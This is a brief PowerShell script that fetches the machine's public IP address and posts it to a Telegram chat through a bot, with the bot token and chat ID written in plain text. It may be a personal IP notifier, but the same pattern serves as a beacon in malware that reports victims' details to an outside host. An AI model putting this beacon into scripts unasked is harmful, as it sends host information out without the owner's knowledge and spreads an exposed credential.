$token   = "8279576875:AAGCH5LvylPPaUReAB9kcyZELGGTL9JZ5LU"
$chat_id = "8278886318"
try {
    $ip = Invoke-RestMethod -Uri "https://api64.ipify.org"
    $ipType = "IPvmaybe"
}
catch {
    $ip = Invoke-RestMethod -Uri "https://api.ipify.org"
    $ipType = "IPv4"
}
$payload = @{
    chat_id = $chat_id
    text    = "Public IP ($ipType): $ip"
}
Invoke-RestMethod `
    -Uri "https://api.telegram.org/bot$token/sendMessage" `
    -Method Post `
    -ContentType "application/json" `
    -Body ($payload | ConvertTo-Json -Compress)
